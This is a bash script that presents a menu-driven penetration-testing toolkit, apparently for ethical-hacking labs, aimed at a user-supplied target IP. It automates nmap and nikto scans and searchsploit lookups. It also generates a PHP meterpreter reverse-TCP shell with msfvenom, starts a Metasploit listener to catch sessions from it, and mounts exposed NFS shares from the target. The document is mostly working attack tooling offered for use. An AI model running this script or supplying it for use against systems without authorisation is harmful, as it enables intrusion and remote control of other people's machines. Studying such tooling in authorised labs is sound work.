#!/bin/bash
# script for test
dirname="Scans"
mkdir $dirname
service postgresql start
my_local_ip="$(ifconfig eth0 | grep 'inet [^ ]*' | cut -d: -f2 | awk '{print $2}')"
clear
echo "  _____ _   _   _____         _    "
echo " | ____| | | | |_   _|__  ___| |_  "
echo " |  _| | |_| |   | |/ _ \/ __| __| "
echo " | |___|  _  |   | |  __/\__ \ |_  "
echo " |_____|_| |_|   |_|\___||___/\__| "
echo " / ___|  ___ _ __(_)_ __ | |_      "
echo " \___ \ / __| '__| | '_ \| __|     "
echo "  ___) | (__| |  | | |_) | |_      "
echo " |____/ \___|_|  |_| .__/ \__|     "
echo "                   |_|             "
printf "\nCreated by William Fitzgerald\n\n"
echo "Tagret IP: "
read target_ip
PS3='Please enter your choice: '
options=("Nmap Scan" "Nikto Scan" "Show My IP" "Create PHP Shell" "Start Reverse Listener" "Show Ports (can only be done after Nmap Scan)" "SearchSploit (can only be done after Nmap Scan)" "NFS Misconfiguration exploitation" "Clear Screen" "Quit")
printf "\n"
select opt in "${options[@]}"
do
    case $opt in
        "Nmap Scan")
	    printf "\n"
            sudo nmap -sV -p- $target_ip -oX $dirname/Nmap.xml -oG $dirname/Nmap.grep -T4
	    printf "\nScan Completed!\n\n"
            ;;
        "Nikto Scan")
	    printf "\n"
	    cd $dirname
	    nikto -h $target_ip -output Nikto.html
	    cd ..
	    printf "\nScan Completed!"
	    printf "\n"
            ;;
        "Show My IP")
            printf "\n$my_local_ip\n\n"
            ;;
	"Create PHP Shell")
	    printf "\n"
            msfvenom -p php/meterpreter_reverse_tcp LHOST=$my_local_ip LPORT=4444 -f raw > $dirname/shell.php
	    printf "\nShell created!\n\n"
            ;;
	"Start Reverse Listener")
	    printf "\n"
	    touch $dirname/msf.rc
	    echo workspace -a ethical_hacking_test >> $dirname/msf.rc
	    echo use exploit/multi/handler >> $dirname/msf.rc
	    echo set payload php/meterpreter_reverse_tcp >> $dirname/msf.rc
	    echo set LHOST $my_local_ip >> $dirname/msf.rc
	    echo set LPORT 4444 >> $dirname/msf.rc
	    echo set ExitOnSession false >> $dirname/msf.rc
	    echo exploit -j -z >> $dirname/msf.rc
	    msfconsole -r $dirname/msf.rc
            ;;
	"Show Ports (can only be done after Nmap Scan)")
	    printf "\n"
            cat $dirname/Nmap.grep | grep 'Ports: ' | cut -d ' ' -f4- | sed 's/\,/\n/g' | awk '{print $1,$2}' | awk '{split($0,a,"/"); print a[1],"\t",a[2],"\t",a[5],"\t",a[7]}'
	    printf "\n"
            ;;
	"SearchSploit (can only be done after Nmap Scan)")
            searchsploit --nmap $dirname/Nmap.xml
	    printf "\n\n--- Manual searching is still advised ---\n\n"
            ;;
        "NFS Misconfiguration exploitation")
            target_dir_mount="$(showmount -e $target_ip | grep '/' | awk '{print $1}')"
	    mkdir $dirname/nfs_mount
	    sudo mount -t nfs $target_ip':'$target_dir_mount $dirname/nfs_mount/
	    printf "Mounted Drive!"
	    printf "\n"
            ;;
        "Clear Screen")
            clear
            ;;
	"Quit")
            break
            ;;
        *) echo "invalid option $REPLY";;
    esac
done
